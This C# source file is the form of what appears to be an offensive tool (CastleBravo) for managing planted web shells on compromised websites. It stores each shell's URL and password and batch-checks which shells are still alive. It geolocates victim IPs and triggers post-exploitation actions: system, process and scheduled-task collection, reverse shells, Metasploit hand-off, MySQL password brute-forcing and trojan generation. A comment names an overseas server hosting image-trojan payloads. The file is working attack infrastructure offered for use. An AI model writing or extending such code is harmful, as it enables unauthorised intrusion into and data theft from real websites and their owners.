using C2.Business.CastleBravo.WebShellTool.SettingsDialog;
using C2.Core;
using C2.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static C2.Utils.GuarderUtil;

namespace C2.Business.CastleBravo.WebShellTool
{

    public partial class WebShellManageForm : Form
    {
        public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
        private int NumberOfAlive { get; set; }
        private int NumberOfHost { get => setOfHost.Count; }
        private int NumberOfIPAddress { get => setOfIPAddress.Count; }

        private HashSet<string> setOfIPAddress;
        private HashSet<string> setOfHost;

        List<WebShellTaskConfig> tasks = new List<WebShellTaskConfig>();
        readonly string configFFP = Path.Combine(Global.ResourcesPath, "WebShellConfig", "config.db");

        private ToolStripItem[] enableItems;
        private DateTime s; // 自动保存
        private SGType sgType;
        //

        private FindSet finder;

        public WebShellManageForm()
        {
            InitializeComponent();
            InitializeToolStrip();
            InitializeOther();
            InitializeLock();
        }

        private void ResetSLabel()
        {
            ItemCountSLabel.Text = string.Format("共{0}项", LV.Items.Count);
            ProxyEnableSLabel.Text = "代理" + (Proxy.Enable ? "启用" : "关闭");
            HitCacheSLabel.Text = string.Format("加速命中:{0}", cacheHit);
        }

        private void InitializeOther()
        {
            setOfHost = new HashSet<string>();
            setOfIPAddress = new HashSet<string>();
            NumberOfAlive = 0;
            finder = new FindSet(LV);
            LV.ListViewItemSorter = new LVComparer();
            cache = new Dictionary<WebShellTaskConfig, CheckAliveResult>();
        }

        private void InitializeToolStrip()
        {
            // 批量验活时, 与其他菜单项互斥
            enableItems = new ToolStripItem[]
            {
                this.editDDB,
                this.proxySettingMenu,
                this.批量验活Menu,
                this.境外站验活Menu,
                this.二刷不活Menu,
                this.checkAliveDDB,
                this.trojanMenu,
                this.infoCollectionMenu,
                this.passwdBlastingMenuItem,
            };
            this.Size = new Size(1275, 500);
            this.threadNumberButton.SelectedIndex = 8;
        }
        private void InitializeLock()
        {
            if (IsLocked())
            {
                trojanMenu.Enabled = false;
                infoCollectionMenu.Enabled = false;
                //右键菜单
                EnterToolStripMenuItem.Enabled = false;
                SuscideMenuItem.Enabled = false;
                ReverseShellMenu.Enabled = false;
                msfMenu.Enabled = false;
                DDMenuItem.Enabled = false;
            }
        }
        private bool IsThreeGroup()
        {
            return ConfigUtil.IsTG();
        }

        private bool IsLocked()
        {
            if (IsThreeGroup() || File.Exists(ClientSetting.UnlockFilePath))
                UnlockButton.Enabled = false;
            return UnlockButton.Enabled;
        }
        
        public void FuctionUnlock()
        {
            trojanMenu.Enabled = true;
            infoCollectionMenu.Enabled = true;
            批量验活Menu.Enabled = true;
            二刷不活Menu.Enabled = true;
            //右键菜单
            EnterToolStripMenuItem.Enabled = true;
            SuscideMenuItem.Enabled = true;
            CheckAliveSelectedItemMenuItem.Enabled = true;
            ReverseShellMenu.Enabled = true;
            msfMenu.Enabled = true;
            DDMenuItem.Enabled = true;
            UnlockButton.Enabled = false;//按钮不可用
        }

        private void 添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WebShellTaskConfig config = new AddWebShellForm().ShowDialog(ST.NowString());
            if (config == WebShellTaskConfig.Empty)
                return;

            LV.Items.Add(NewLVI(config));
            tasks.Add(config);
            SaveDB();
        }

        private void 批量添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddAllWebShellForm dialog = new AddAllWebShellForm();
            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            // 修复添加6万左右数据卡死的问题
            using (GuarderUtil.WaitCursor)
                LV.Items.AddRange(NewLVIS(dialog.Tasks));
            tasks.AddRange(dialog.Tasks);
            SaveDB();
        }

        private void RefreshTasks(bool create = true)
        {
            tasks.Clear();
            foreach (ListViewItem lvi in LV.Items)
            {
                WebShellTaskConfig config = create ? new WebShellTaskConfig(GetSubItemsTextArray(lvi)) : 
                    lvi.Tag as WebShellTaskConfig;
                // 针对删除菜单的优化,删除先置Empty后删除  
                if (config != WebShellTaskConfig.Empty)
                {
                    lvi.Tag = config; // 关联
                    tasks.Add(config);
                }         
            }
        }

        private string[] GetSubItemsTextArray(ListViewItem lvi)
        {
            List<string> array = new List<string>(lvi.SubItems.Count);
            for (int i = 0; i < lvi.SubItems.Count; i++)
                array.Add(lvi.SubItems[i].Text);
            return array.ToArray();
        }

        private void ClearAll()
        {
            tasks.Clear();
            RefreshLV();
            SaveDB();
        }

        private void SaveDB()
        {
            ResetSLabel();
            StaticItems();
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Create))
                    new BinaryFormatter().Serialize(stream, tasks);
            }
            catch { }
        }

        private void WebShellManageForm_Load(object sender, EventArgs e)
        {
            LoadDB();
            RefreshLV();
            ResetSLabel();
            StaticItems();
        }

        private void LoadDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Open))
                    tasks = new BinaryFormatter().Deserialize(stream) as List<WebShellTaskConfig>;
            }
            catch { }
        }

        private void RefreshLV()
        {
            LV.Items.Clear();  // 不能删表头的clear方法
            using (GuarderUtil.WaitCursor)
                LV.Items.AddRange(NewLVIS(tasks));
        }

        private void RefreshBackColor()
        {
            foreach(ListViewItem lvi in LV.Items)
            {
                lvi.BackColor = isAlertnatingRows ? SingleRowColor : AltertnatingRowColor;
                isAlertnatingRows = !isAlertnatingRows;
            }
        }

        static bool isAlertnatingRows = true;
        static readonly Color SingleRowColor = Color.FromArgb(255, 217, 225, 242);
        static readonly Color AltertnatingRowColor = Color.FromArgb(255, 208, 206, 206);
        private ListViewItem NewLVI(WebShellTaskConfig config)
        {
            ListViewItem lvi = new ListViewItem(config.CreateTime);
            lvi.SubItems.Add(config.Remark);
            lvi.SubItems.Add(config.Url);
            lvi.SubItems.Add(config.Password);
            lvi.SubItems.Add(config.TrojanType);
            lvi.SubItems.Add(config.Status);
            lvi.SubItems.Add(config.ClientVersion);
            lvi.SubItems.Add(config.ProbeInfo);
            lvi.SubItems.Add(config.IP);
            lvi.SubItems.Add(config.Country);
            lvi.SubItems.Add(config.Country2);
            lvi.SubItems.Add(config.DatabaseConfig);

            // 指针关联
            lvi.Tag = config;
            // 设置间隔行背景色
            lvi.BackColor = isAlertnatingRows ? SingleRowColor : AltertnatingRowColor;
            isAlertnatingRows = !isAlertnatingRows;
            return lvi;
        }

        private ListViewItem[] NewLVIS(IList<WebShellTaskConfig> tasks)
        {
            ListViewItem[] lvis = new ListViewItem[tasks.Count];
            for (int i = 0; i < lvis.Length; i++)
                lvis[i] = NewLVI(tasks[i]);
            return lvis;
        }

        private void EnterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            new WebShellDetailsForm(LV.SelectedItems[0].Tag as WebShellTaskConfig).ShowDialog();
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in LV.SelectedItems)
                lvi.Tag = WebShellTaskConfig.Empty;

            RefreshTasks(false);
            using (WaitCursor)
                SaveDB();
            using (new LayoutGuarder(LV))
                foreach (ListViewItem lvi in LV.SelectedItems)
                    lvi.Remove();
        }

        private void EditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig old = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellTaskConfig cur = new AddWebShellForm().ShowDialog(old);

            if (cur == WebShellTaskConfig.Empty)
                return;

            LV.SelectedItems[0].Tag = cur;
            LV.SelectedItems[0].SubItems[1].Text = cur.Remark;         // 名称
            LV.SelectedItems[0].SubItems[2].Text = cur.Url;            // url
            LV.SelectedItems[0].SubItems[3].Text = cur.Password;       // 密码
            LV.SelectedItems[0].SubItems[4].Text = cur.TrojanType;     // 木马类型
            LV.SelectedItems[0].SubItems[5].Text = cur.Status;         // 木马状态
            LV.SelectedItems[0].SubItems[6].Text = cur.ClientVersion;  // 客户端版本
            LV.SelectedItems[0].SubItems[7].Text = cur.ProbeInfo;      // 后SG字段
            LV.SelectedItems[0].SubItems[8].Text = cur.IP;             // 目标IP
            LV.SelectedItems[0].SubItems[9].Text = cur.Country;        // 归属地
            LV.SelectedItems[0].SubItems[10].Text = cur.Country2;      // 归属地
            // 按道理不会出现索引越界
            tasks[tasks.IndexOf(old)] = cur;
            SaveDB();
        }
        private void LV_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            EditToolStripMenuItem_Click(sender, e);
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // 复制当前的选中单元格到粘贴板
            if (this.LV.SelectedItems.Count == 0)
                return;

            StringBuilder sb = new StringBuilder();
            foreach (ListViewItem lvi in this.LV.SelectedItems)
            {
                for (int i = 0; i < lvi.SubItems.Count; i++)
                    sb.Append(lvi.SubItems[i].Text).Append(OpUtil.TabSeparator);
                sb.TrimEndT().AppendLine();
            }
            FileUtil.TryClipboardSetText(sb.ToString());
        }


        private void TrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            string type = (sender as ToolStripMenuItem).ToolTipText.Split('|')[0];
            new TrojanGeneratorForm(type).ShowDialog();
        }

        private void GodzillaTrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("哥斯拉配套Trojan", true).ShowDialog();
        }


        private void CheckAliveSelectedItemMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            ResetProgressMenuValue(LV.SelectedItems.Count);
            
            ResetCheckCache(ResetTypeEnum.选中项验活);
            // 启动加速
            CheckAliveSpeedUpBackground();

            DoCheckAliveItems(LV.SelectedItems, false, false);
            RefreshTasks();
            SaveDB();
        }



        private void CheckAliveAllMenuItem_Click(object sender, EventArgs e)
        {
            // 清空加速缓存
            ResetCheckCache(ResetTypeEnum.重新开始);
            // 启动加速
            CheckAliveSpeedUpBackground();
            DoCheckAliveAllMenuItemClick(false);
        }

        private bool actionNeedStop = false;

        private void CheckAliveStopMenu_Click(object sender, EventArgs e)
        {
            actionNeedStop = true;
        }

        private void SecondCheckAliveTaskStatus()
        {
            ResetProgressMenuValue(LV.Items.Count);

            foreach (ListViewItem lvi in LV.Items)
            {   // 没启用跳过尸体, 清空 或 死状态 清空
                if (lvi.SubItems[5].Text.In(new string[] { "×", "待" }))
                    lvi.SubItems[5].Text = "待";
                else
                    this.progressBar.Maximum--;
            }
            CheckAliveAll(true, false);
            EndCheckAlive();
        }

        private void DoCheckAliveAllMenuItemClick(bool safeMode)
        {   // 刷新前先强制清空
            ResetProgressMenuValue(LV.Items.Count);

            foreach (ListViewItem lvi in LV.Items)
                ClearAliveSubItems(lvi);

            CheckAliveAll(false, safeMode);
            EndCheckAlive();
        }

        private void CheckSavePoint()
        {
            TimeSpan gap = DateTime.Now - s;
            if (gap.TotalMinutes >= 5)
            {   // 5分钟保存一次
                RefreshTasks();
                SaveDB();
                s = DateTime.Now;
            }
        }

        private void ResetProgressMenuValue(int progressMaxValue)
        {
            this.progressMenu.Text = string.Empty;
            this.progressBar.Value = 0;
            this.progressBar.Maximum = progressMaxValue;
            this.actionNeedStop = false;
            this.NumberOfAlive = 0;
            this.setOfIPAddress.Clear();
            this.setOfHost.Clear();
        }

        private int CountStatusAliveItem()
        {
            int sum = 0;
            foreach (ListViewItem lvi in LV.Items)
                if (lvi.SubItems[5].Text == "√")
                    sum++;
            return sum;
        }

        private int CountStatusBlankItem()
        {
            int sum = 0;
            foreach (ListViewItem lvi in LV.Items)
                if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                    sum++;
            return sum;
        }

        private void UpdateAliveItems(ListViewItem lvi, bool safeMode = false)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            string rts = CheckAliveOneTaskSync(task, safeMode);

            if (rts == "√")
            {
                this.NumberOfAlive++;
                this.setOfHost.Add(NetUtil.GetHostByUrl(task.Url));
                this.setOfIPAddress.Add(task.IP);
            }
            lvi.SubItems[5].Text = rts;
            lvi.SubItems[8].Text = task.IP;
            lvi.SubItems[9].Text = task.Country;
            lvi.SubItems[10].Text = task.Country2;
            lvi.ListView.RedrawItems(lvi.Index, lvi.Index, false);
        }
        private void UpdateProgress()
        {
            this.progressMenu.Text = string.Format("{0}/{1} {5} - 活 {2} - 站 {3} - IP {4} - CH {6}",
                ++progressBar.Value,
                progressBar.Maximum,
                NumberOfAlive,
                NumberOfHost,
                NumberOfIPAddress,
                progressBar.Value == progressBar.Maximum ? "完成" : string.Empty,
                cacheHit);
        }

        private static void ClearAliveSubItems(ListViewItem lvi)
        {
            lvi.SubItems[5].Text = string.Empty;
            lvi.SubItems[8].Text = string.Empty;
            lvi.SubItems[9].Text = string.Empty;
            lvi.SubItems[10].Text = string.Empty;
        }


        private static bool DoEventsWait(int timeout, Task<bool> t)
        {
            // 代理慢, timeout富裕一些
            timeout = Proxy == ProxySetting.Empty ? timeout : timeout * 2;
            int start = Environment.TickCount;

            while (Math.Abs(Environment.TickCount - start) < timeout * 1000)
            {
                Application.DoEvents();
                if (t.Wait(1000))
                    return t.Result;
            }
            return false;
        }

        private bool RefreshIPAddress(WebShellTaskConfig task)
        {
            // 二刷时直接利用上次IP结果,加速
            if (task.Status != "待")
            {
                Application.DoEvents();
                task.IP = NetUtil.GetHostAddresses(task.Url);
                Application.DoEvents();
                task.Country = NetUtil.IPQuery_WhoIs(task.IP);
                Application.DoEvents();
                task.Country2 = NetUtil.IPQuery_ChunZhen(task.IP);
                Application.DoEvents();
            }

            return NetUtil.IsChina(task.Country) || NetUtil.IsChina(task.Country2);
        }
   
        private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearAll();
        }

        private void SuscideMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig config = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellClient client = new WebShellClient(config.Url, config.Password, config.ClientVersion, config.DatabaseConfig);
            client.Suscide();
            RemoveToolStripMenuItem_Click(sender, e);
        }

        private void ProxyMenu_Click(object sender, EventArgs e)
        {
            Proxy = new ProxySettingForm(Proxy).ShowDialog();
            ResetSLabel();
        }

        private void SaveResultsMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "BCP文件|*.bcp";
            dialog.FileName = "D洞管理" + DateTime.Now.ToString("yyyyMMddHHmm") + ".bcp";

            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            using (GuarderUtil.WaitCursor)
                SaveResultToLocal(dialog.FileName);
        }

        private void SaveResultToLocal(string path)
        {
            StreamWriter sw = new StreamWriter(path, false);
            try
            {
                List<string> tmpLists = new List<string>();
                foreach (ListViewItem lvi in LV.Items)
                {
                    tmpLists.Clear();
                    for (int i = 0; i < lvi.SubItems.Count; i++)
                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n", OpUtil.StringBlank));
                    sw.WriteLine(string.Join("\t", tmpLists.ToArray()));
                }
            }
            catch { }
            finally
            {
                if (sw != null)
                    sw.Close();
            }
        }

        private void SecondeCheckAliveMenu_Click(object sender, EventArgs e)
        {
            ResetCheckCache(ResetTypeEnum.二刷不活);
            // 启动加速
            CheckAliveSpeedUpBackground();
            SecondCheckAliveTaskStatus();
        }

        private void RefreshOtherMenu_Click(object sender, EventArgs e)
        {
            // 清空加速缓存
            ResetCheckCache(ResetTypeEnum.重新开始_境外站);
            // 启动加速
            CheckAliveSpeedUpBackground();
            DoCheckAliveAllMenuItemClick(true);
        }

        private void WebShellManageForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.actionNeedStop = true;
            using (GuarderUtil.WaitCursor)
            {
                RefreshTasks();
                SaveDB();
            }
        }

        private void StaticItems()
        {
            int dead = 0;
            int alive = 0;

            foreach (ListViewItem lvi in LV.Items)
            {
                switch (lvi.SubItems[5].Text)
                {
                    case "√":
                        alive++;
                        break;
                    case "×":
                        dead++;
                        break;
                }
            }
            StatusLabel.Text = string.Format("活 {0} - 死 {1}", alive, dead);
        }

        private void ClearScanResult()
        {
            foreach (ListViewItem lvi in LV.Items)
                lvi.SubItems[7].Text = string.Empty;
        }

        #region 后信息收集模块,该模块部分payload是存储在境外服务器103.43.17.9上的图片马
        //系统信息
        private void AllSysInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            BatchInfoColletion(false);
        }
        private void AliveSysInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            BatchInfoColletion(true);
        }

        // 进程信息
        private void AllProcessView_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            BatchInfoColletion(false);
        }

        private void AliveProcessView_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            BatchInfoColletion(true);
        }

        // 定时任务
        private void AllScheduleTask_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            BatchInfoColletion(false);
        }

        private void AliveScheduleTask_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            BatchInfoColletion(true);
        }

        // 地理位置部分
        private void AllLocationInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            BatchInfoColletion(false);
        }
        private void AliveLocationInfo_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            BatchInfoColletion(true);
        }

        

        private void DoCurrentItemTask()
        {
            this.actionNeedStop = false;
            ResetProgressMenuValue(LV.SelectedItems.Count);
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem item in LV.SelectedItems)
                {
                    if (actionNeedStop)
                        break;
                    SingleInfoCollection(item);
                    UpdateProgress();
                }
        }
       
        // msf部分
        private void MSFMenu_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            DialogResult dialogResult = new MSFSet(LV.SelectedItems[0].Tag as WebShellTaskConfig, Proxy).ShowDialog();
            if (dialogResult.Equals(DialogResult.OK))
                this.infoConfigStatus.Text = DateTime.Now + ": MSF联动已发起";
        }

        private void ReverseShellMenu_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            DialogResult dialogResult = new ReverseShellSet(LV.SelectedItems[0].Tag as WebShellTaskConfig, Proxy).ShowDialog();
            if (dialogResult.Equals(DialogResult.OK))
                this.infoConfigStatus.Text = DateTime.Now + ": 反弹Shell已发起";
        }


        private void LV_MouseClick(object sender, MouseEventArgs e)
        {
            this.LV.ContextMenuStrip = this.contextMenuStrip;

            if (e.Button != MouseButtons.Right || e.Clicks != 1 || LV.SelectedItems.Count == 0)
                return;

            ListViewItem item = LV.SelectedItems[0];
            ListViewItem.ListViewSubItem subItem = item.GetSubItemAt(e.X, e.Y);

            if (subItem == null || item.SubItems.IndexOf(subItem) != 7)
                return;

            if (!subItem.Text.StartsWith(Path.Combine(Global.UserWorkspacePath, "后信息采集")))
                return;

            this.LV.ContextMenuStrip = this.contextMenuStrip1;

        }
        private void OpenFileMenuItem_Click(object sender, EventArgs e)
        {
            ProcessUtil.ProcessOpen(CurrentFilePath());
        }

        private void OpenDirMenuItem_Click(object sender, EventArgs e)
        {
            FileUtil.ExploreDirectory(CurrentFilePath());
        }

        private void CopyDirMenuItem_Click(object sender, EventArgs e)
        {
            FileUtil.TryClipboardSetText(CurrentFilePath());
        }
        private string CurrentFilePath()
        {
            return LV.SelectedItems[0].SubItems[7].Text;
        }
        #endregion

        private void UnlockButton_Click(object sender, EventArgs e)
        {
            if (new FunctionUnlockForm().ShowDialog() == DialogResult.OK)
                FuctionUnlock();
        }

        private void 查找ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            finder.FindHit();
        }

        private void LV_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            LVComparer c = LV.ListViewItemSorter as LVComparer;
            c.col = e.Column;
            c.asce = !c.asce;
            using(WaitCursor)
            using (new LayoutGuarder(LV))
            {
                LV.Sort();
                RefreshTasks(false); // 回写任务, 速度慢, 将来要优化
                RefreshBackColor();  // 重新布局
            }
                
        }

        private void 地理定位ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            DoCurrentItemTask();
        }

        private void 定时任务ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            DoCurrentItemTask();
        }

        private void 进程列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            DoCurrentItemTask();
        }

        private void 系统信息ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            DoCurrentItemTask();
        }
        // 超级ping部分
        private void SuperPingMenuItem_Click(object sender, EventArgs e)
        {
            CreatePingPayload();
            DoCurrentItemTask();
        }     
        private void AllSuperPing_Click(object sender, EventArgs e)
        {
            CreatePingPayload();
            BatchInfoColletion(false);
        }
        private void AlivSuperPing_Click(object sender, EventArgs e)
        {
            CreatePingPayload();
            BatchInfoColletion(true);
        }



        private void 配置文件探针ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            int timeout = ConfigPayloadOk();
            if (timeout == 0) 
                return;
            SelectedInfoColletion(timeout);
        }

        private void UserMYD探针ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            if (!UserMYDPayloadOK())
                return;
            SelectedInfoColletion();
        }


        private void 全部验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ResetCheckCache(ResetTypeEnum.继续上次);
            // 启动加速
            CheckAliveSpeedUpBackground();
            DoCheckAliveContinue(false);
        }

        private void 境外验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ResetCheckCache(ResetTypeEnum.继续上次_境外);
            // 启动加速
            CheckAliveSpeedUpBackground();
            DoCheckAliveContinue(true);
        }

        private void MB_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            BatchInfoColletion(false);
        }

        private void MB_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            BatchInfoColletion(true);
        }

        private void MB_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            DoCurrentItemTask();
        }

        private void 配置文件探针_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int timeout = ConfigPayloadOk();
            if (timeout == 0)
                return;
            BatchInfoColletion(false, timeout);
        }

        private void 配置文件探针_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int timeout = ConfigPayloadOk();
            if (timeout == 0)
                return;
            BatchInfoColletion(true, timeout);
        }

        private void 配置文件探针_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            int timeout = ConfigPayloadOk();
            if (timeout == 0)
                return;
            SelectedInfoColletion(timeout);
        }

        private void UserMYD探针_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!UserMYDPayloadOK())
                return;
            BatchInfoColletion(false);
        }

        private void UserMYD探针_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!UserMYDPayloadOK())
                return;
            BatchInfoColletion(true);
        }

        private void UserMYD探针_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            if (!UserMYDPayloadOK())
                return;
            SelectedInfoColletion();
        }

        private void MB_设置ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new MysqlBlastingSet().ShowDialog();
        }
    }
}
